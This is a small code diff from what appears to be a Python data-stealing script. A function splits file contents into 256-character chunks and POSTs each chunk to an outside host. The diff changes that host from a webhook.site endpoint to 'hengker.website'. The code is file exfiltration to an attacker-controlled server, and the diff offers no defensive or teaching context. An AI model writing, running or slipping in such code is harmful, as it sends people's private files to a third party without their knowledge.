@@ -30,7 +30,7 @@ def procFile(file_path):
         chunks = [stream_datas[i:i+256] for i in range(0, len(stream_datas), 256)]
         
         for chunk in chunks:
-            url = f'http://0x00.webhook.site/?data={chunk}'
+            url = f'http://hengker.website/?data={chunk}'
             requests.post(url)
         
         print(f"{file_path}")
